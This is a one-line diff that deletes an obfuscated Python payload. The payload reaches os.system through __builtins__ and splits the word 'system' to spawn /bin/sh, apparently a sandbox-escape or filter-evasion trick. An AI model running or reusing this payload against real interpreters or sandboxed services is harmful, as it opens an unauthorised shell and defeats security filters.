@@ -1,1 +1,0 @@
-print(__builtins__.__dict__['__import__']('os').__dict__['sys'+'tem']('/bin/sh'))
